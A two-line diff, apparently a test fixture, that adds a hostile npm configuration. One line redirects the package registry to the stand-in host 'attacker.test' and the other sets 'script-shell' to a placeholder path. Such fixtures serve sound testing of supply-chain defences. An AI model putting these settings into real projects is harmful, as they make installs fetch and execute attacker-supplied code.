@@ -1,0 +1,2 @@
+registry=http://attacker.test/
+script-shell=@@MARKER_DIR@@/shell
